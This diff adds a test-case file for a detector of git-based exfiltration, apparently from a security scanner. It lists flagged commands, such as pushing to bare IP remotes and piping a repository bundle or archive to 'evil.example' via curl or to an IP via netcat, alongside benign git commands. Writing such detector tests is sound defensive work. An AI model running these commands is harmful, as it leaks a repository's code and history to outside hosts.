@@ -1,0 +1,20 @@
+# EX-016: Git remote exfiltration
+# Test cases for snapshot testing
+# Detects data exfiltration via git: remotes/pushes to bare IP URLs and
+# bundling/archiving a repository piped into a network tool.
+
+# === Cases that SHOULD be detected ===
+git remote add exfil http://192.168.1.50/loot.git
+git remote add backup git://45.9.148.3/repo.git
+git push http://10.0.0.1:8080/loot HEAD
+git config remote.origin.url http://45.9.148.3/x.git
+git bundle create - --all | curl -X POST --data-binary @- http://evil.example
+git archive --format=tar HEAD | nc 203.0.113.9 4444
+
+# === Cases that should NOT be detected (benign) ===
+git remote add origin https://github.com/user/repo.git
+git push origin main
+git bundle create backup.bundle --all
+git archive --format=tar -o site.tar HEAD
+git remote add upstream git@github.com:org/repo.git
+git push http://127.0.0.1:9000/local HEAD
